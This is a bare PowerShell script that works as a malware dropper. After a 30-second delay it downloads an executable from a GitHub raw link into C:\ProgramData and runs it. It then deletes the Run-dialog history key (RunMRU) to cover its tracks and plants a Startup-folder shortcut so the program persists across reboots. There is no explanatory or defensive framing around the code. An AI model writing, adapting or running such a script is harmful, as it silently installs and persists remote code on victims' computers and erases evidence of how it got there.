Start-Sleep -s 30
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$down = New-Object System.Net.WebClient
$url = 'https://github.com/raju-fakhrul/project/blob/main/AW_pro_OTP.exe?raw=true'
$file = "C:\ProgramData\AW_prod_OTP.exe"
$down.DownloadFile($url,$file)
$exec = New-Object -com shell.application
$exec.shellexecute($file)
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
$objShell = New-Object -ComObject ("WScript.Shell")
$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\Start Menu\Programs\Startup" + "\AW_OTP.lnk")
$objShortCut.TargetPath="C:\ProgramData\AW_pro_OTP.exe"
$objShortCut.Save()
exit

